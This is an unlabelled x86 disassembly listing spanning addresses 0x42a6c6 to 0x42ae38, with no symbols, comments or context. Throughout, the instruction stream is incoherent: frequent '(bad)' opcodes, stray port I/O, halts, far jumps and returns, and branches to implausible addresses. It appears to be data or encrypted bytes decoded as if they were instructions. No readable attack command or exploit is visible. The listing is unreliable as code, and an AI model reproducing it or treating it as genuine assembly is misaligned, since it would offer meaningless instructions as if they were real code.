  42a6c6:	(bad)  
  42a6c7:	or     al,0x5b
  42a6c9:	dec    ebp
  42a6ca:	or     BYTE PTR [ebx],dh
  42a6cc:	inc    ebp
  42a6cd:	xor    esi,DWORD PTR ds:0x708088d
  42a6d3:	in     eax,0x98
  42a6d5:	add    BYTE PTR [edx],dh
  42a6d7:	inc    ebp
  42a6d8:	pop    edi
  42a6d9:	xor    eax,edx
  42a6db:	test   DWORD PTR [eax],0x81108b8b
  42a6e1:	dec    ebp
  42a6e2:	sub    al,0x33
  42a6e4:	add    BYTE PTR [ebx],dh
  42a6e6:	push   esi
  42a6e7:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  42a6ed:	mov    edi,eax
  42a6ef:	or     BYTE PTR [ebp+0x45],al
  42a6f2:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  42a6f8:	cmp    cl,cl
  42a6fa:	pushf  
  42a6fb:	push   es
  42a6fc:	mov    DWORD PTR [ebx-0x4],0xf817853b
  42a703:	dec    ebp
  42a704:	inc    ebp
  42a705:	and    BYTE PTR [eax],0x50
  42a708:	pushf  
  42a709:	push   0x4de4d1c7
  42a70e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  42a714:	fsubr  st,st(1)
  42a716:	xlat   BYTE PTR ds:[ebx]
  42a717:	rol    bh,cl
  42a719:	mov    edx,esp
  42a71b:	or     BYTE PTR [ebp+0x4588f84d],al
  42a721:	mov    ecx,DWORD PTR [eax]
  42a723:	or     BYTE PTR [eax],al
  42a725:	push   ebp
  42a726:	mov    edi,DWORD PTR [eax+0xfc728b]
  42a72c:	dec    ebp
  42a72d:	enter  0xceba,0x8
  42a731:	retf   0x1807
  42a734:	ret    0x984d
  42a737:	mov    esi,DWORD PTR [edx]
  42a739:	or     al,0x33
  42a73b:	into   
  42a73c:	add    edx,esi
  42a73e:	add    ecx,edx
  42a740:	bswap  eax
  42a742:	ror    esi,0x98
  42a745:	dec    ebp
  42a746:	add    cl,ch
  42a748:	mov    edi,edi
  42a74a:	hlt    
  42a74b:	inc    esi
  42a74d:	inc    ebp
  42a74e:	ret    0x4533
  42a751:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  42a757:	or     BYTE PTR [ebx],dh
  42a759:	dec    ebp
  42a75a:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  42a760:	jne    0xff8ca727
  42a766:	inc    ebp
  42a767:	inc    ebp
  42a768:	mov    esi,DWORD PTR [ebx]
  42a76a:	clc    
  42a76b:	pop    esi
  42a76c:	ret    0xcaeb
  42a76f:	mov    eax,esi
  42a771:	call   0x5203f844
  42a776:	dec    ebp
  42a777:	add    eax,0xf8728b
  42a77c:	adc    eax,0xce0ccac9
  42a781:	push   ebp
  42a782:	ret    0xc6ec
  42a785:	in     al,dx
  42a786:	call   0x3342f48f
  42a78b:	push   edi
  42a78c:	add    edi,eax
  42a78e:	xor    eax,eax
  42a790:	jmp    0x42a7d7
  42a792:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a798:	add    eax,edi
  42a79a:	shr    eax,cl
  42a79c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a7a2:	mov    edi,DWORD PTR [ecx]
  42a7a4:	in     al,dx
  42a7a5:	pushf  
  42a7a6:	ret    0x84c7
  42a7a9:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a7af:	inc    ebp
  42a7b0:	in     al,dx
  42a7b1:	cmp    BYTE PTR [ebp-0x64],al
  42a7b4:	mov    eax,edi
  42a7b6:	cld    
  42a7b7:	fmul   st(2),st
  42a7b9:	sbb    dl,al
  42a7bb:	jmp    0x9c3b:0x374d45c1
  42a7c2:	jbe    0x42a78b
  42a7c4:	mov    esp,eax
  42a7c6:	clc    
  42a7c7:	add    BYTE PTR [ebp+0x0],cl
  42a7ca:	mov    ecx,ecx
  42a7cc:	lea    eax,[ebp-0x5]
  42a7cf:	mov    edi,edi
  42a7d1:	call   0x51cdf81b
  42a7d6:	hlt    
  42a7d7:	xor    eax,edx
  42a7d9:	mov    esi,0x987284
  42a7de:	xor    cl,dl
  42a7e0:	mov    esi,eax
  42a7e2:	hlt    
  42a7e3:	into   
  42a7e4:	inc    ebp
  42a7e5:	scas   eax,DWORD PTR es:[edi]
  42a7e6:	mov    ebp,ecx
  42a7e8:	cld    
  42a7e9:	add    dl,cl
  42a7eb:	add    dl,al
  42a7ed:	inc    ebp
  42a7ee:	shr    DWORD PTR [ebx],0x4d
  42a7f1:	xor    edi,DWORD PTR [ebx]
  42a7f3:	mov    DWORD PTR [edi],ecx
  42a7f5:	clc    
  42a7f6:	dec    esi
  42a7f7:	inc    ebp
  42a7f8:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a7fe:	ret    0xc6ca
  42a801:	mov    BYTE PTR [ebp-0x32],0x53
  42a805:	scas   eax,DWORD PTR es:[edi]
  42a806:	inc    ebp
  42a807:	jmp    0x42a840
  42a809:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a810:	pop    ebx
  42a811:	xor    ecx,DWORD PTR [ebp+0x3]
  42a814:	mov    eax,DWORD PTR [ebx]
  42a816:	clc    
  42a817:	test   edx,ecx
  42a819:	mov    ecx,esi
  42a81b:	cld    
  42a81c:	call   0x8ab6ed66
  42a821:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a827:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a82d:	fdiv   QWORD PTR [ebx]
  42a82f:	retf   0xce89
  42a832:	in     al,0xc1
  42a834:	inc    ebp
  42a835:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a83b:	into   
  42a83c:	mov    dh,0xc1
  42a83f:	call   0x8c16edc8
  42a844:	(bad)  
  42a845:	cld    
  42a846:	mov    ecx,DWORD PTR [ebp-0x14]
  42a849:	xor    eax,ecx
  42a84b:	lea    eax,[ebp+0x8]
  42a84e:	mov    esi,DWORD PTR [edx-0x4]
  42a851:	add    dl,al
  42a853:	inc    ebp
  42a854:	mov    esp,0x32d8988b
  42a859:	dec    ebp
  42a85a:	mov    esi,DWORD PTR [ebx]
  42a85c:	cld    
  42a85d:	xor    eax,edx
  42a85f:	sub    ebp,DWORD PTR [eax-0x75]
  42a862:	int    0xec
  42a864:	sub    ecx,eax
  42a866:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a86c:	mov    esi,esp
  42a86e:	call   0x3416f5f7
  42a873:	inc    DWORD PTR [ebx]
  42a875:	mov    edi,DWORD PTR [ebx]
  42a877:	cld    
  42a878:	jne    0x42a8c7
  42a87a:	mov    esi,DWORD PTR [ebx]
  42a87c:	aam    0x8d
  42a87e:	dec    ebp
  42a87f:	or     BYTE PTR [ebx],dh
  42a881:	jb     0x42a886
  42a883:	add    BYTE PTR [edi+0x45],bl
  42a886:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a88d:	xor    ebp,esp
  42a88f:	xor    eax,edi
  42a891:	sub    edi,esp
  42a893:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a899:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a8a0:	inc    ebp
  42a8a1:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a8a7:	clc    
  42a8a8:	mov    eax,edi
  42a8aa:	nop
  42a8ab:	fadd   QWORD PTR [eax]
  42a8ad:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a8b3:	jmp    0x42a83e
  42a8b5:	mov    eax,DWORD PTR [ecx]
  42a8b7:	fadd   DWORD PTR [eax]
  42a8b9:	inc    ebp
  42a8ba:	or     DWORD PTR [ebx],esi
  42a8bc:	dec    eax
  42a8bd:	add    edx,DWORD PTR [ebx-0x2d]
  42a8c0:	dec    ebp
  42a8c1:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a8c7:	inc    ebp
  42a8c8:	push   eax
  42a8c9:	mov    dl,BYTE PTR [ecx-0xd]
  42a8cc:	xor    ecx,DWORD PTR [ebp-0x45]
  42a8cf:	(bad)  
  42a8d1:	rol    BYTE PTR [eax],0xc1
  42a8d4:	ret    
  42a8d5:	inc    ebp
  42a8d6:	inc    ebp
  42a8d7:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a8dd:	xor    eax,ebx
  42a8df:	add    eax,DWORD PTR [ebp+0x23]
  42a8e2:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a8e8:	cmp    edi,0xc
  42a8eb:	dec    ebp
  42a8ec:	inc    ebp
  42a8ed:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a8f3:	inc    ebp
  42a8f4:	mov    esi,DWORD PTR [ebx]
  42a8f6:	clc    
  42a8f7:	lea    eax,[ebp+0x45725407]
  42a8fd:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a901:	xor    edi,DWORD PTR [eax]
  42a903:	mov    ecx,0xff8b8d4d
  42a908:	push   esp
  42a909:	enter  0x4df7,0x23
  42a90d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a913:	mov    eax,DWORD PTR [ebx]
  42a915:	loopne 0x42a902
  42a917:	ret    0xc68b
  42a91a:	push   esp
  42a91b:	enter  0x9745,0x8b
  42a91f:	inc    ebp
  42a920:	cld    
  42a921:	mov    eax,edi
  42a923:	clc    
  42a924:	ret    
  42a925:	ret    0xc645
  42a928:	mov    esi,DWORD PTR [ebx]
  42a92a:	cld    
  42a92b:	pop    esi
  42a92c:	mov    ebx,0x83458bc3
  42a932:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a936:	dec    ebp
  42a937:	cmp    BYTE PTR [ebx],dh
  42a939:	pushf  
  42a93a:	add    edi,DWORD PTR [edx-0x7767a77]
  42a940:	fcom   DWORD PTR [ebp+0x45]
  42a943:	mov    edi,DWORD PTR [edx]
  42a945:	adc    al,0x9c
  42a947:	inc    ebp
  42a948:	(bad)  
  42a949:	mov    ebx,eax
  42a94b:	adc    al,0x85
  42a94d:	cmp    al,0x1
  42a950:	inc    ebp
  42a951:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a958:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a95e:	xor    eax,DWORD PTR [ebx]
  42a960:	add    edi,DWORD PTR [ecx+ecx*4]
  42a963:	mov    esp,esi
  42a965:	clc    
  42a966:	inc    ebp
  42a967:	inc    ebp
  42a968:	add    edx,DWORD PTR [esi+0xc]
  42a96b:	mov    edi,0x7ff0845
  42a970:	in     al,dx
  42a971:	(bad)  
  42a972:	jne    0x42a90c
  42a974:	mov    esi,DWORD PTR [edx]
  42a976:	clc    
  42a977:	add    ebp,DWORD PTR [edx]
  42a979:	mov    edi,edi
  42a97b:	in     al,dx
  42a97c:	mov    DWORD PTR [ebp-0x10],eax
  42a97f:	xor    eax,DWORD PTR [ebp+0x3]
  42a982:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a988:	fmul   DWORD PTR [ebx-0x173caf39]
  42a98e:	lea    ecx,[ecx+0x45e8d4bc]
  42a994:	clc    
  42a995:	mov    edi,edi
  42a997:	cmp    BYTE PTR [ebp+0x4d],al
  42a99a:	test   DWORD PTR [eax+0x74],ecx
  42a99d:	inc    ecx
  42a99e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a9a4:	ret    
  42a9a5:	inc    eax
  42a9a6:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a9ac:	push   eax
  42a9ad:	dec    eax
  42a9ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a9af:	sar    bh,1
  42a9b1:	enter  0x458b,0xec
  42a9b5:	mov    eax,DWORD PTR [ebp+0x38]
  42a9b8:	mov    eax,ecx
  42a9ba:	fadd   DWORD PTR [ebx]
  42a9bc:	dec    ebp
  42a9bd:	inc    eax
  42a9be:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a9c4:	inc    ebp
  42a9c5:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a9cb:	fadd   QWORD PTR [ebx]
  42a9cd:	inc    ebp
  42a9ce:	or     al,0x33
  42a9d0:	dec    ebp
  42a9d1:	add    edi,DWORD PTR [ebx]
  42a9d3:	mov    DWORD PTR [edx-0x28],esi
  42a9d6:	mov    eax,DWORD PTR [ebp-0x10]
  42a9d9:	mov    eax,DWORD PTR [eax+0x10]
  42a9dc:	mov    eax,edi
  42a9de:	lock ret 
  42a9e0:	inc    ecx
  42a9e1:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a9e7:	fsubr  st,st(5)
  42a9e9:	test   DWORD PTR [eax],eax
  42a9eb:	clc    
  42a9ec:	push   0x45
  42a9ee:	(bad)  
  42a9ef:	cmp    ebp,esp
  42a9f1:	pushf  
  42a9f2:	inc    ebp
  42a9f3:	(bad)  
  42a9f4:	push   eax
  42a9f5:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a9f9:	clc    
  42a9fa:	mov    eax,0xf8008584
  42a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  42aa02:	mov    edi,0x4585c3cc
  42aa08:	clc    
  42aa09:	mov    eax,DWORD PTR [ebp+0x14]
  42aa0c:	cmp    al,BYTE PTR [ebp-0x64]
  42aa0f:	mov    edi,eax
  42aa11:	in     al,dx
  42aa12:	les    esi,FWORD PTR [ebp-0x7b]
  42aa15:	mov    edi,eax
  42aa17:	or     al,0x4d
  42aa19:	dec    ebp
  42aa1a:	mov    eax,ebp
  42aa1c:	in     al,0xf2
  42aa1e:	dec    ebp
  42aa1f:	dec    DWORD PTR [ecx+0x4dc7e045]
  42aa25:	fmul   DWORD PTR [ecx+0x4df8f085]
  42aa2b:	inc    ebp
  42aa2c:	mov    DWORD PTR [ebx],esi
  42aa2e:	fadd   QWORD PTR [ebx]
  42aa30:	dec    ebp
  42aa31:	push   eax
  42aa32:	xor    eax,DWORD PTR [ebp+0x3]
  42aa35:	push   eax
  42aa36:	mov    DWORD PTR [eax],ebx
  42aa38:	fdivr  st,st(7)
  42aa3a:	test   BYTE PTR [ebx-0x3fc21000],0x85
  42aa41:	dec    esi
  42aa42:	clc    
  42aa43:	inc    ebp
  42aa44:	test   BYTE PTR [ebx],dh
  42aa46:	add    DWORD PTR [ebx],eax
  42aa48:	add    BYTE PTR [eax+0x4d],dl
  42aa4b:	jne    0x42aa80
  42aa4d:	lea    ecx,[ebx-0x7617fc44]
  42aa53:	div    ah
  42aa55:	inc    DWORD PTR [ebp+0x45]
  42aa58:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  42aa5e:	jb     0x42a9eb
  42aa60:	add    BYTE PTR [eax*2-0x17ba743f],cl
  42aa67:	mov    ecx,DWORD PTR [ebp-0x10]
  42aa6a:	xor    ecx,DWORD PTR [ebp+0x3]
  42aa6d:	mov    edi,DWORD PTR [ebx]
  42aa6f:	adc    BYTE PTR [ebp+0x41],dh
  42aa72:	mov    ecx,DWORD PTR [ebx-0x37382704]
  42aa78:	ret    
  42aa79:	push   ss
  42aa7a:	push   0x45
  42aa7c:	lea    ecx,[ebx+0x4de80cb0]
  42aa82:	sti    
  42aa83:	add    edi,edi
  42aa85:	or     BYTE PTR [ebp+0x4d],al
  42aa88:	mov    ebp,DWORD PTR [ebx]
  42aa8a:	xor    ebp,ecx
  42aa8c:	mov    al,BYTE PTR [edx]
  42aa8e:	add    eax,0xc7200
  42aa93:	jne    0x42aae2
  42aa95:	lea    esi,[ebx]
  42aa97:	mov    al,0xf
  42aa99:	call   0xea15e
  42aa9e:	sar    DWORD PTR [eax],0x84
  42aaa1:	pushf  
  42aaa2:	add    DWORD PTR [ecx+0x4545d000],ecx
  42aaa8:	mov    edi,DWORD PTR [ecx]
  42aaaa:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  42aab1:	test   DWORD PTR [eax],eax
  42aab3:	clc    
  42aab4:	dec    ebp
  42aab5:	inc    ebp
  42aab6:	xor    edi,DWORD PTR [ebx]
  42aab8:	setl   al
  42aabb:	(bad)  
  42aabc:	retf   
  42aabd:	rol    cl,1
  42aabf:	dec    ebp
  42aac0:	test   BYTE PTR [ebp+0x4d00cc01],cl
  42aac6:	inc    ebp
  42aac7:	lea    ecx,[ebx-0x75b2cc38]
  42aacd:	lea    eax,ds:0x4d72c4
  42aad3:	mov    ecx,DWORD PTR [ebp-0x4]
  42aad6:	xor    ecx,edi
  42aad8:	bswap  ebx
  42aada:	ror    BYTE PTR [ebp-0x35],0xe9
  42aade:	rol    DWORD PTR [ecx],0x84
  42aae1:	add    BYTE PTR [ecx],al
  42aae3:	cmp    al,BYTE PTR [eax]
  42aae5:	pushf  
  42aae6:	inc    ebp
  42aae7:	jnp    0x8a42deea
  42aaed:	mov    eax,DWORD PTR ds:0xcf72e8
  42aaf3:	lock dec ebp
  42aaf5:	retf   
  42aaf6:	xor    ecx,DWORD PTR [ebp+0xf]
  42aaf9:	mov    eax,eax
  42aafb:	fmul   st,st(3)
  42aafd:	test   ecx,0x1988484
  42ab03:	xor    al,BYTE PTR [eax]
  42ab05:	mov    DWORD PTR [ebp-0x28],eax
  42ab08:	mov    eax,DWORD PTR [ebp+0x33]
  42ab0b:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  42ab11:	ret    
  42ab12:	add    al,cl
  42ab14:	dec    ebp
  42ab15:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  42ab1b:	add    ecx,DWORD PTR ds:0xc7250
  42ab21:	inc    ebp
  42ab22:	rcl    DWORD PTR [eax+0x4d],0x27
  42ab26:	mov    edi,edi
  42ab28:	xor    ecx,DWORD PTR [ebx+0xde48a]
  42ab2e:	jb     0x42aaf7
  42ab30:	add    BYTE PTR [ecx+eax*8-0x74cdb2b8],al
  42ab37:	mov    esi,DWORD PTR [ebx]
  42ab39:	cld    
  42ab3a:	mov    cl,bh
  42ab3c:	or     eax,0x372b6
  42ab41:	cmp    ecx,eax
  42ab43:	jne    0x42abc0
  42ab49:	mov    eax,DWORD PTR [ebp-0x20]
  42ab4c:	mov    eax,DWORD PTR [eax]
  42ab4e:	xor    eax,edi
  42ab50:	mov    al,BYTE PTR [ebp+eax*1+0x327248]
  42ab57:	mov    ecx,DWORD PTR [ebp-0x4]
  42ab5a:	mov    ecx,edi
  42ab5c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42ab62:	jb     0x42ab73
  42ab64:	add    BYTE PTR [edi-0x3f],dl
  42ab67:	add    BYTE PTR [ebp-0x75],cl
  42ab6a:	mov    esi,eax
  42ab6c:	xor    eax,DWORD PTR [eax]
  42ab6e:	mov    al,bh
  42ab70:	or     eax,0x487284
  42ab75:	xor    al,cl
  42ab77:	mov    ecx,DWORD PTR [ebp-0x4]
  42ab7a:	mov    ecx,edi
  42ab7c:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  42ab82:	jb     0x42ab93
  42ab84:	add    BYTE PTR [edi],dh
  42ab86:	enter  0x8500,0x8b
  42ab8a:	add    ah,bl
  42ab8c:	add    BYTE PTR [eax],al
  42ab8e:	inc    ebp
  42ab8f:	(bad)  
  42ab90:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a48]
  42ab97:	mov    esi,DWORD PTR [edx-0x4]
  42ab9a:	add    bh,cl
  42ab9c:	dec    ebp
  42ab9d:	mov    dh,0x8b
  42ab9f:	add    esi,DWORD PTR [ebx]
  42aba1:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  42aba7:	add    BYTE PTR [eax],al
  42aba9:	mov    eax,ecx
  42abab:	loopne 0x42abfa
  42abad:	add    BYTE PTR [ebx-0x757bcc39],cl
  42abb3:	dec    eax
  42abb4:	or     eax,0x8b7232
  42abb9:	in     al,0xc1
  42abbb:	or     DWORD PTR [ebp-0x31],ecx
  42abbe:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a48]
  42abc5:	xor    dh,BYTE PTR [edx-0x75]
  42abc8:	add    al,dh
  42abca:	enter  0x4f09,0xcf
  42abce:	inc    ebp
  42abcf:	mov    WORD PTR [ebx-0x75cdccb8],cs
  42abd5:	or     al,BYTE PTR ds:0xe4728b
  42abdb:	or     DWORD PTR [ebp-0x31],ecx
  42abde:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4c]
  42abe5:	cmp    dh,BYTE PTR [edx+0xf]
  42abe8:	add    bl,dl
  42abea:	rol    DWORD PTR [eax],0x4d
  42abed:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  42abf3:	(bad)  
  42abf4:	or     eax,0x487284
  42abf9:	xor    al,cl
  42abfb:	mov    ecx,DWORD PTR [ebp-0x20]
  42abfe:	mov    ecx,DWORD PTR [ecx]
  42ac00:	xor    ecx,edi
  42ac02:	mov    cl,BYTE PTR [ebp+ecx*1+0x327248]
  42ac09:	xor    cl,al
  42ac0b:	mov    ecx,DWORD PTR [edi]
  42ac0d:	fadd   QWORD PTR [ebp+0x9]
  42ac10:	call   0xffcfa6e4
  42ac15:	dec    eax
  42ac16:	dec    ebp
  42ac17:	xor    bh,BYTE PTR [ebx]
  42ac19:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  42ac1d:	loopne 0x42ac1b
  42ac1f:	or     edi,eax
  42ac21:	iret   
  42ac22:	ret    
  42ac23:	mov    WORD PTR [ebp+0x4c],es
  42ac26:	mov    esi,DWORD PTR [edx]
  42ac28:	call   0x84527367
  42ac2d:	(bad)  
  42ac2e:	cwde   
  42ac2f:	add    BYTE PTR [edx],dh
  42ac31:	mov    esi,DWORD PTR [ebx]
  42ac33:	fmul   QWORD PTR [ebx+0x55c7fc00]
  42ac39:	test   BYTE PTR [ebx],dh
  42ac3b:	dec    eax
  42ac3c:	add    esi,DWORD PTR [edx]
  42ac3e:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  42ac44:	dec    edi
  42ac46:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d48]
  42ac4d:	xor    al,BYTE PTR [ebx]
  42ac4f:	mov    edi,DWORD PTR [ebx]
  42ac51:	in     al,0x75
  42ac53:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  42ac59:	dec    eax
  42ac5a:	xor    esi,DWORD PTR [edx]
  42ac5c:	lea    ecx,[edx]
  42ac5e:	or     BYTE PTR [ebx+0x900f072],cl
  42ac64:	ja     0x42ac35
  42ac66:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b4],cl
  42ac6d:	cmp    ch,al
  42ac6f:	jne    0x42ac64
  42ac71:	mov    edi,edi
  42ac73:	fadd   QWORD PTR [ebp+0x0]
  42ac76:	mov    eax,edi
  42ac78:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb8]
  42ac7f:	mov    edx,DWORD PTR [ebx]
  42ac81:	in     al,0x45
  42ac83:	or     DWORD PTR [ebx],esi
  42ac85:	iret   
  42ac86:	add    ecx,DWORD PTR [eax+edx*2+0x45321848]
  42ac8d:	xor    dl,BYTE PTR [eax-0x75]
  42ac90:	sbb    al,ah
  42ac92:	dec    DWORD PTR [ecx]
  42ac94:	mov    ecx,edi
  42ac96:	in     al,dx
  42ac97:	mov    eax,es
  42ac99:	dec    eax
  42ac9a:	mov    DWORD PTR [edx],esi
  42ac9c:	fmul   QWORD PTR [edx]
  42ac9e:	jne    0x42ac2b
  42aca0:	(bad)  
  42aca1:	(bad)  
  42aca3:	or     DWORD PTR [ebp-0x31],eax
  42aca6:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b4]
  42acad:	cmp    bh,bh
  42acaf:	jne    0x42acf6
  42acb1:	lea    ecx,[ebx-0x38372750]
  42acb7:	inc    ebx
  42acb9:	mov    eax,ecx
  42acbb:	mov    eax,0xa00c111
  42acc0:	jne    0x42ad07
  42acc2:	mov    esi,DWORD PTR [ebx]
  42acc4:	test   al,0x3
  42acc6:	inc    ebp
  42acc7:	mov    DWORD PTR [eax-0xc],edx
  42acca:	fiadd  WORD PTR [ebp-0x1]
  42accd:	xor    ecx,DWORD PTR [ebx+0x4d30108d]
  42acd3:	jb     0x42acd6
  42acd5:	add    BYTE PTR [ebx+0x454dacc7],cl
  42acdb:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  42ace1:	retf   
  42ace2:	mov    edx,ecx
  42ace4:	adc    al,0x84
  42ace6:	(bad)  
  42ace7:	std    
  42ace8:	ret    
  42ace9:	jmp    FWORD PTR [edi-0x2b7474bb]
  42acef:	hlt    
  42acf0:	rol    edi,0x82
  42acf3:	ret    
  42acf4:	cld    
  42acf5:	enter  0x11ff,0x45
  42acf9:	inc    ebp
  42acfa:	pop    edi
  42acfb:	mov    ebx,DWORD PTR [ebx+0x14]
  42acfe:	ret    0xc7
  42ad01:	test   BYTE PTR [ebx+0x45325198],cl
  42ad07:	jmp    0x42ac94
  42ad09:	push   0x8
  42ad0b:	call   DWORD PTR [esi]
  42ad0d:	in     al,dx
  42ad0e:	add    BYTE PTR [ebp+0x1],0x50
  42ad12:	add    bl,ah
  42ad14:	add    bh,bh
  42ad16:	icebp  
  42ad17:	mov    ecx,DWORD PTR [eax]
  42ad19:	cld    
  42ad1a:	pop    es
  42ad1b:	dec    ebp
  42ad1c:	shl    DWORD PTR [ebx],0x72
  42ad1f:	add    eax,DWORD PTR [eax]
  42ad21:	cmp    edx,ecx
  42ad23:	je     0x42ad35
  42ad25:	mov    esi,DWORD PTR [ebp-0x4]
  42ad28:	inc    edi
  42ad2a:	or     al,0xc3
  42ad2c:	jmp    FWORD PTR [edx-0x18]
  42ad2f:	(bad)  
  42ad30:	sti    
  42ad31:	cwde   
  42ad32:	(bad)  
  42ad33:	call   0xffa0a63e
  42ad38:	or     al,0x45
  42ad3a:	push   ebp
  42ad3b:	sub    esp,0x18
  42ad3e:	push   ebx
  42ad3f:	inc    ebp
  42ad40:	mov    edi,edi
  42ad42:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  42ad49:	test   al,0x50
  42ad4b:	inc    ebp
  42ad4c:	push   ecx
  42ad4d:	push   eax
  42ad4e:	xor    esp,DWORD PTR [edi-0x748d0041]
  42ad54:	add    ah,bh
  42ad56:	(bad)  
  42ad57:	dec    ebp
  42ad58:	add    DWORD PTR [ebx],esi
  42ad5a:	inc    ebp
  42ad5b:	add    ecx,DWORD PTR [ebx+0x74943b]
  42ad61:	push   0xffffff8b
  42ad63:	dec    DWORD PTR [ebx-0x7fbaeb54]
  42ad69:	add    eax,DWORD PTR [ecx]
  42ad6b:	or     BYTE PTR [eax],al
  42ad6d:	call   0xff84a572
  42ad72:	mov    eax,DWORD PTR [ebp+0x14]
  42ad75:	mov    ecx,DWORD PTR [ecx+0x801ac]
  42ad7b:	inc    ebp
  42ad7c:	dec    ecx
  42ad7d:	add    ebp,DWORD PTR [edx+0x14]
  42ad80:	push   0x8b3045
  42ad85:	call   0x33acfafa
  42ad8a:	inc    DWORD PTR [ebx]
  42ad8c:	mov    DWORD PTR [edi],ecx
  42ad8e:	mov    eax,ecx
  42ad90:	or     BYTE PTR [ebp-0x3d],cl
  42ad93:	cmp    eax,edi
  42ad95:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  42ad9a:	adc    BYTE PTR [ebx+0x5eff0845],cl
  42ada0:	adc    al,0xc9
  42ada2:	inc    ebp
  42ada3:	adc    BYTE PTR [eax+0x55],dl
  42ada6:	jne    0x42ad94
  42ada8:	call   0xff53ad38
  42adad:	dec    ebp
  42adae:	inc    ebp
  42adaf:	mov    ecx,DWORD PTR [ebx+0x390338b]
  42adb5:	add    BYTE PTR [ebx],bh
  42adb7:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  42adbb:	push   eax
  42adbc:	or     al,0x51
  42adbe:	dec    ebp
  42adbf:	xor    DWORD PTR [ebx],0xf320398
  42adc5:	cmp    eax,DWORD PTR [ebp+0x74]
  42adc8:	mov    edi,edi
  42adca:	pop    edi
  42adcb:	adc    BYTE PTR [ebx+0x75],bl
  42adce:	ret    0x50
  42add1:	mov    edx,DWORD PTR ss:[edi-0x7d]
  42add5:	(bad)  
  42add6:	clc    
  42add7:	mov    esp,ebp
  42add9:	pop    ecx
  42adda:	mov    ecx,0xf80085c2
  42addf:	mov    ecx,DWORD PTR [ecx+edx*2]
  42ade2:	push   esi
  42ade3:	push   esi
  42ade4:	(bad)  
  42ade5:	lock add DWORD PTR [ebp+0x44],eax
  42ade9:	mov    edx,DWORD PTR [eax]
  42adeb:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  42adef:	or     BYTE PTR [eax+0x7],dl
  42adf2:	push   ecx
  42adf3:	ret    
  42adf4:	xor    ebx,DWORD PTR [eax+0x37232be]
  42adfa:	add    BYTE PTR [ecx+0x147c8bfe],cl
  42ae00:	or     al,0x80
  42ae02:	jge    0x42ae05
  42ae04:	mov    DWORD PTR [eax],eax
  42ae06:	and    al,0x8
  42ae08:	cmp    DWORD PTR [ebp+0x10],eax
  42ae0b:	mov    edx,DWORD PTR [esi]
  42ae0d:	xchg   esp,eax
  42ae0e:	dec    esp
  42ae0f:	add    BYTE PTR [eax],dl
  42ae11:	mov    ecx,edx
  42ae13:	add    edx,DWORD PTR [esp+edi*1+0x8]
  42ae17:	dec    ebp
  42ae18:	into   
  42ae19:	mov    ebp,DWORD PTR [edi+0x240089d8]
  42ae1f:	mov    edx,DWORD PTR [eax+0x14]
  42ae22:	das    
  42ae23:	add    al,0x45
  42ae25:	add    BYTE PTR [ebp+0x0],dh
  42ae28:	mov    edi,edi
  42ae2a:	and    al,0x50
  42ae2c:	mov    eax,DWORD PTR [eax]
  42ae2e:	and    al,0xd1
  42ae30:	xor    eax,DWORD PTR [esi]
  42ae32:	lea    eax,[ebp+0x8]
  42ae35:	xor    esi,DWORD PTR [edx+0x3]
  42ae38:	add    BYTE PTR [ecx+0x4510fc44],cl
